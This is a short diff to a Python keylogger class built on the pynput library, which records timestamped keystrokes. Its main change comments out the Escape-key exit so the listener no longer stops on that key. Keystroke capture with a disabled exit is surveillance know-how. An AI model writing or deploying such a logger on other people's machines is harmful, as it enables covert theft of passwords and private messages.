@@ -2,6 +2,7 @@ import os
 from datetime import datetime
 from pynput import keyboard
 
+
 class KeyLogger:
 
     def __init__(self):
@@ -18,9 +19,9 @@ class KeyLogger:
 
     def log_key(self, key):
        
-        if key == keyboard.Key.esc:  
-            print("Exiting keylogger...")
-            return False  
+        # if key == keyboard.Key.esc:  
+        #     print("Exiting keylogger...")
+        #     return False  
         try:
            
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
@@ -32,7 +33,8 @@ class KeyLogger:
     def start_logging(self):
        
         with keyboard.Listener(on_press=self.log_key) as listener:
-            listener.join()  
+            listener.join()
+              
 
 class Main:
     def __init__(self):
